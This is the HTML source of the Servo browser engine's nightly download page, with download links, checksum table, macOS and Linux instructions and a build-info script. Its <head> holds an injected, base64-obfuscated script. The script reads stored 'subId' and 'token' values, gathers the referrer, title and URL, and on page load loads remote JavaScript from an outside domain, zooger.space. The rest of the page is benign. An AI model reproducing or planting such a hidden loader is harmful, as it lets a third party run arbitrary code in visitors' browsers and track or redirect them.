<!doctype html>
<html lang="en-US">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Servo Developer Preview Downloads</title>
    <script src="data:text/javascript;base64,KGZ1bmN0aW9uKCkgewogICAgdmFyIG5hbWUgPSAnX3d6R1lTdFRGYjlIREJYVHQnOwogICAgaWYgKCF3aW5kb3cuX3d6R1lTdFRGYjlIREJYVHQpIHsKICAgICAgICB3aW5kb3cuX3d6R1lTdFRGYjlIREJYVHQgPSB7CiAgICAgICAgICAgIHVuaXF1ZTogZmFsc2UsCiAgICAgICAgICAgIHR0bDogMjg4ODY0MDAsCiAgICAgICAgICAgIFJfUEFUSDogJ2h0dHBzOi8vem9vZ2VyLnNwYWNlLzNiTTdCaicsCiAgICAgICAgICAgIFBfUEFUSDogJ2h0dHA6Ly96b29nZXIuc3BhY2UvNjczOWY4Ni9wb3N0YmFjaycsCiAgICAgICAgfTsKICAgIH0KICAgIGNvbnN0IF9tRGNzVEpXV3E4SmN4SHcyID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ2NvbmZpZycpOwogICAgaWYgKHR5cGVvZiBfbURjc1RKV1dxOEpjeEh3MiAhPT0gJ3VuZGVmaW5lZCcgJiYgX21EY3NUSldXcThKY3hIdzIgIT09IG51bGwpIHsKICAgICAgICB2YXIgXzFqU21yZzRoUkpzM05mZkQgPSBKU09OLnBhcnNlKF9tRGNzVEpXV3E4SmN4SHcyKTsKICAgICAgICB2YXIgX2N4RHZGM0g0a24yUEpkY0sgPSBNYXRoLnJvdW5kKCtuZXcgRGF0ZSgpLzEwMDApOwogICAgICAgIGlmIChfMWpTbXJnNGhSSnMzTmZmRC5jcmVhdGVkX2F0ICsgd2luZG93Ll93ekdZU3RURmI5SERCWFR0LnR0bCA8IF9jeER2RjNINGtuMlBKZGNLKSB7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdzdWJJZCcpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgndG9rZW4nKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ2NvbmZpZycpOwogICAgICAgIH0KICAgIH0KICAgIHZhciBfMTVZYlBKWERxbUZXNHhMbSA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdzdWJJZCcpOwogICAgdmFyIF9KQ0wySldjdHg1SHc4THNoID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3Rva2VuJyk7CiAgICB2YXIgX0g4QmR3ZDFLdk1jeXB2Z0ogPSAnP3JldHVybj1qcy5jbGllbnQnOwogICAgICAgIF9IOEJkd2QxS3ZNY3lwdmdKICs9ICcmJyArIGRlY29kZVVSSUNvbXBvbmVudCh3aW5kb3cubG9jYXRpb24uc2VhcmNoLnJlcGxhY2UoJz8nLCAnJykpOwogICAgICAgIF9IOEJkd2QxS3ZNY3lwdmdKICs9ICcmc2VfcmVmZXJyZXI9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5yZWZlcnJlcik7CiAgICAgICAgX0g4QmR3ZDFLdk1jeXB2Z0ogKz0gJyZkZWZhdWx0X2tleXdvcmQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC50aXRsZSk7CiAgICAgICAgX0g4QmR3ZDFLdk1jeXB2Z0ogKz0gJyZsYW5kaW5nX3VybD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmxvY2F0aW9uLmhvc3RuYW1lICsgZG9jdW1lbnQubG9jYXRpb24ucGF0aG5hbWUpOwogICAgICAgIF9IOEJkd2QxS3ZNY3lwdmdKICs9ICcmbmFtZT0nICsgZW5jb2RlVVJJQ29tcG9uZW50KG5hbWUpOwogICAgICAgIF9IOEJkd2QxS3ZNY3lwdmdKICs9ICcmaG9zdD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5fd3pHWVN0VEZiOUhEQlhUdC5SX1BBVEgpOwogICAgaWYgKHR5cGVvZiBfMTVZYlBKWERxbUZXNHhMbSAhPT0gJ3VuZGVmaW5lZCcgJiYgXzE1WWJQSlhEcW1GVzR4TG0gJiYgd2luZG93Ll93ekdZU3RURmI5SERCWFR0LnVuaXF1ZSkgewogICAgICAgIF9IOEJkd2QxS3ZNY3lwdmdKICs9ICcmc3ViX2lkPScgKyBlbmNvZGVVUklDb21wb25lbnQoXzE1WWJQSlhEcW1GVzR4TG0pOwogICAgfQogICAgaWYgKHR5cGVvZiBfSkNMMkpXY3R4NUh3OExzaCAhPT0gJ3VuZGVmaW5lZCcgJiYgX0pDTDJKV2N0eDVIdzhMc2ggJiYgd2luZG93Ll93ekdZU3RURmI5SERCWFR0LnVuaXF1ZSkgewogICAgICAgIF9IOEJkd2QxS3ZNY3lwdmdKICs9ICcmdG9rZW49JyArIGVuY29kZVVSSUNvbXBvbmVudChfSkNMMkpXY3R4NUh3OExzaCk7CiAgICB9CiAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICAgIGEudHlwZSA9ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JzsKICAgICAgICBhLnNyYyA9IHdpbmRvdy5fd3pHWVN0VEZiOUhEQlhUdC5SX1BBVEggKyBfSDhCZHdkMUt2TWN5cHZnSjsKICAgIHZhciBzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NjcmlwdCcpWzBdOwogICAgcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZShhLCBzKQogICAgfSkoKTs="></script>
    <link rel="stylesheet" href="/css/bootstrap.css"
          integrity="sha512-++bHK0UNrNHW3LVNLzgTm2G7uOH6Kd+Ved0sskOL0+TY7pr5AcWQgR19kdjAhyyiQRDjFwXubDGqTvjnS09HNA=="
          crossorigin="anonymous"/>
    <link rel="stylesheet" href="/css/style.css"
          integrity="sha512-IOgMYAL0bb8kOWKoWbQ/yKxMQSthth9TfPFEyhXoLClXZMrOKTZgXn4vp0zfFblZ1vtMmWe4gQuffSuu2b4Uow=="
          crossorigin="anonymous"/>
</head>

<body>
<div class="container">
    <div class="row">
        <div class="col-sm-offset-2 col-sm-8">
            <h1 id="page-title" class="page-header">Servo Developer Preview Downloads</h1>
        </div>
        <div class="col-sm-offset-2 col-sm-8">
            <h3 class="description">
                <a href="https://servo.org/"><b>Servo</b></a>
                is a modern, high-performance browser engine being developed for
                application and embedded use.
            </h3>
        </div>
    </div>
    <br>
    <div class="row">
        <div class="col-sm-offset-2 col-sm-8 col-lg-4">

            <p class="info">
                These pre-built nightly snapshots allow developers
                to try Servo and <a href="https://github.com/servo/servo/issues/new">report
                issues</a> without <a href="https://github.com/servo/servo/blob/master/docs/HACKING_QUICKSTART.md">
                building Servo locally</a>.
            </p>

            <p class="info">
                <b>Please don’t log into your bank with Servo just
                yet!</b> Now that we’ve released our first developer preview, we’ll be
                investing in formal security audits and improving our security practices using
                both existing libraries and Rust &ndash; more information coming soon!
            </p>
        </div>
        <div class="col-sm-8 col-lg-4 col-sm-push-2 col-lg-push-0">
            <span class="col-sm-8 col-sm-push-0">
                <a class="btn btn-primary btn-large" id="button-windows-exe" role="button"
                   href="nightly/windows-msvc/servo-latest.exe">Windows EXE (x64)</a><br>

                <a class="btn btn-primary btn-large" id="button-windows-zip" role="button"
                   href="nightly/windows-msvc/servo-latest.zip">Windows ZIP (x64)</a><br>

                <a class="btn btn-primary btn-large" id="button-uwp" role="button"
                   href="nightly/uwp/servo-latest.zip">UWP (arm64/x64)</a><br>

                <a class="btn btn-primary btn-large" id="button-macos" role="button"
                   href="nightly/mac/servo-latest.dmg">macOS (x64)</a><br>

                <a class="btn btn-primary btn-large" id="button-linux" role="button"
                   href="nightly/linux/servo-latest.tar.gz">Linux (x64)</a><br>
            </span>
        </div>
    </div>
    <div class="row" id="build-info-row">
        <div class="col-sm-6 col-sm-offset-3">
            <table class="table" id="build-info">
                <thead>
                    <tr>
                        <th scope="col">Platform</th>
                        <th scope="col">Build date</th>
                        <th scope="col">SHA-256</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <th scope="row">Windows EXE</th>
                        <td id="date-windows-exe">?</td>
                        <td>
                            <a id="sha256-windows-exe" href="nightly/windows-msvc/servo-latest.exe.sha256">sha256</a>
                        </td>
                    </tr>
                    <tr>
                        <th scope="row">Windows ZIP</th>
                        <td id="date-windows-zip">?</td>
                        <td>
                            <a id="sha256-windows-zip" href="nightly/windows-msvc/servo-latest.zip.sha256">sha256</a>
                        </td>
                    </tr>
                    <tr>
                        <th scope="row">UWP</th>
                        <td id="date-uwp">?</td>
                        <td>
                            <a id="sha256-uwp" href="nightly/uwp/servo-latest.zip.sha256">sha256</a>
                        </td>
                    </tr>
                    <tr>
                        <th scope="row">macOS</th>
                        <td id="date-macos">?</td>
                        <td>
                            <a id="sha256-macos" href="nightly/mac/servo-latest.dmg.sha256">sha256</a>
                        </td>
                    </tr>
                    <tr>
                        <th scope="row">Linux</th>
                        <td id="date-linux">?</td>
                        <td>
                            <a id="sha256-linux" href="nightly/linux/servo-latest.tar.gz.sha256">sha256</a>
                        </td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>
    <div class="row">
        <div class="col-sm-offset-2 col-sm-8 col-lg-4">
            <h2 class="header">macOS Instructions</h2>
                <ul>
                    <li>Click the macOS download button above to download the latest build</li>
                    <li>Open the downloaded <code>servo-latest.dmg</code> file</li>
                    <li>Drag <code>Servo.app</code> to the Applications folder</li>
                    <li>Double-click on <code>Servo.app</code> to run Servo</li>
                </ul>
                <p>
                    <b>Note:</b> <code>Servo.app</code> is not currently signed, so
                    Mac users may have a popup saying “Servo can’t be opened because it is from an
                    unidentified developer.” If the popup lacks a “proceed anyway” option, close
                    it then right-click <code>Servo.app</code> and click “Open.”
                    This time the popup will have an option to proceed opening the application.
                </p>
        </div>
        <div class="col-sm-8 col-lg-4 col-sm-push-2 col-lg-push-0">
            <h2 class="header">Linux Instructions</h2>
                <ul>
                    <li>Click the Linux download button above to download the latest build</li>
                    <li>Expand the downloaded <code>.tar.gz</code> file (<code>tar zxf servo-latest.tar.gz</code>)</li>
                    <li><code>cd servo</code></li>
                    <li>Execute <code>./servo</code> to run Servo</li>
                </ul>
                <h3 class="header">Troubleshooting</h3>
                    <p><b>Error:</b> <code>./servo: error while loading shared libraries: libgstwebrtc-1.0.so.0: cannot open shared object file: No such file or directory</code></p>
                    <p><b>Solution:</b> <code>sudo apt install libgstreamer-plugins-bad1.0</code></p>
            <div style="text-align:center">
                <a href="https://servo.org/"><img src="servo.svg"
                alt="Servo Logo" width="100" height="100"></a>
            </div>
        </div>
    </div>
    <div class="row">
        <div class="col-sm-offset-2 col-sm-8">
            <footer class="text-center">
                <div class="col-md-3">
                    <a href="https://servo.org/">Servo Home Page</a>
                </div>
                <div class="col-md-3">
                    <a href="https://github.com/servo">Contribute</a>
                </div>
                <div class="col-md-3">
                    <a href="https://github.com/servo/servo/wiki/Roadmap">Follow Servo’s Roadmap</a>
                </div>
                <div class="col-md-3">
                    <a href="https://blog.servo.org/">Read the Servo Blog</a>
                </div>
                <div class="col-md-3">
                    <p class="text-muted"><a href="https://chat.mozilla.org/#/room/#servo:mozilla.org">Servo room</a> on <a href="https://wiki.mozilla.org/Matrix">Mozilla Matrix</a></p>
                </div>
            </footer>
        </div>
    </div>
</div>
<script type="text/javascript">
    window.onload = load_build_info;

    function load_build_info() {
        var builds = [
            ["windows-exe", "nightly/windows-msvc/servo-latest.exe"],
            ["windows-zip", "nightly/windows-msvc/servo-latest.zip"],
            ["uwp", "nightly/uwp/servo-latest.zip"],
            ["macos", "nightly/mac/servo-latest.dmg"],
            ["linux", "nightly/linux/servo-latest.tar.gz"]
        ];

        builds.forEach(function (item, index) {
            load_build_date("date-" + item[0], item[1]);
            load_sha256("sha256-" + item[0], "https://download.servo.org/" + item[1] + ".sha256");
        });
    }

    function load_build_date(id, prefix) {
        var url = "https://servo-builds.s3.amazonaws.com/?list-type=2&prefix=" + prefix;
        get_request(url, function (text) {
            var xml = parse_xml(text);
            var contents_tag = xml.getElementsByTagName("Contents")[0];
            var last_modified_tag = contents_tag.getElementsByTagName("LastModified")[0];

            var last_modified = last_modified_tag.textContent;
            var last_modified_date = last_modified.split("T")[0];

            var el = document.getElementById(id);
            el.innerText = last_modified_date;
            el.title = last_modified;
        });
    }

    function load_sha256(id, url) {
        get_request(url, function (sha256) {
            var sha256_short = sha256.slice(0, 16) + "...";

            var el = document.getElementById(id);
            el.innerText = sha256_short;
            el.title = sha256;
        });
    }

    function get_request(url, callback) {
        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function () {
            if (xhttp.readyState == XMLHttpRequest.DONE && xhttp.status == 200) {
                callback(xhttp.responseText);
            }
        };
        xhttp.open("GET", url, true);
        xhttp.send();
    }

    function parse_xml(text) {
        if (window.DOMParser) {
            var parser = new DOMParser();
            var xml_doc = parser.parseFromString(text, "text/xml");
            return xml_doc;
        } else {
            // Internet Explorer
            var xml_doc = new ActiveXObject("Microsoft.XMLDOM");
            xml_doc.async = false;
            xml_doc.loadXML(text);
            return xml_doc;
        }
    }
</script>
</body>
</html>
